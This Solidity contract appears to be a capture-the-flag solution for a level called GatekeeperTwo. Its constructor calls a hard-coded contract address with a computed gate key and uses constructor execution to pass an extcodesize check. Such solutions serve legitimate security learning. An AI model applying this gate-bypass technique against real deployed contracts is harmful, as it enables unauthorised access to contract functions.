pragma solidity ^0.8.0;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoSolver {
    //this solves extcodesize(caller()) == 0 since the contract isn't fully instantiated in the blockchain yet.
    constructor() {
        //0x55836Ee1A06B0B293B5502535B61200d0F66F103
        address instance = 0x55836Ee1A06B0B293B5502535B61200d0F66F103;
        bytes8 gate = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        (bool suc,) = instance.call{value: 0}(abi.encodeWithSignature("enter(bytes8)", gate));
    }
}